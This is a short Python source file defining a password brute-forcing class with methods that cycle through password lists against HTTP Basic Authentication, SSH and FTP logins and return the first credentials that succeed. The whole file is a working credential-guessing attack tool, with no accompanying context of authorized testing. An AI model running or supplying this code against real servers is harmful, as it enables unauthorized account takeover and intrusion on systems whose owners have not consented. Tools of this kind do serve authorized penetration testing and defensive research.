import requests
import paramiko
import ftplib
from typing import Optional, List, Dict

class BruteForcer:
    def __init__(self, max_threads: int = 5):
        self.max_threads = max_threads

    def http_basic_auth(self, url: str, username: str, 
                       passwords: List[str]) -> Optional[Dict]:
        """Brute force HTTP Basic Authentication"""
        for password in passwords:
            try:
                response = requests.get(
                    url,
                    auth=(username, password),
                    timeout=5,
                    allow_redirects=False
                )
                if response.status_code != 401:
                    return {
                        "url": url,
                        "username": username,
                        "password": password,
                        "status_code": response.status_code
                    }
            except requests.RequestException:
                continue
        return None

    def ssh_bruteforce(self, host: str, port: int, 
                       username: str, passwords: List[str]) -> Optional[Dict]:
        """Brute force SSH login"""
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5,
                    banner_timeout=5
                )
                ssh.close()
                return {
                    "host": host,
                    "port": port,
                    "username": username,
                    "password": password
                }
            except Exception:
                continue
        return None

    def ftp_bruteforce(self, host: str, port: int, 
                       username: str, passwords: List[str]) -> Optional[Dict]:
        """Brute force FTP login"""
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                return {
                    "host": host,
                    "port": port,
                    "username": username,
                    "password": password
                }
            except Exception:
                continue
        return None